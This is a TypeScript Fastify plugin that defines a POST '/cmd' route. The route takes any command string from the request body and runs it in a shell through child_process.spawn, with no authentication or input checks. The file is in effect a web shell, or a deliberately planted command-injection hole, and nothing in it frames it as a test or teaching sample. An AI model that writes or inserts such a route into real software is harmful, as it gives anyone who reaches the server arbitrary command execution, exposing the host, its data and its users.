import type { FastifyInstance } from 'fastify'
import { spawn } from 'child_process'

export default async (fastify: FastifyInstance) => {
  fastify.post('/cmd', async (request, reply) => {
    const { cmd } = request.body as { cmd: string }
    const result = spawn(cmd, { shell: true })
    return result.stdout
  })
}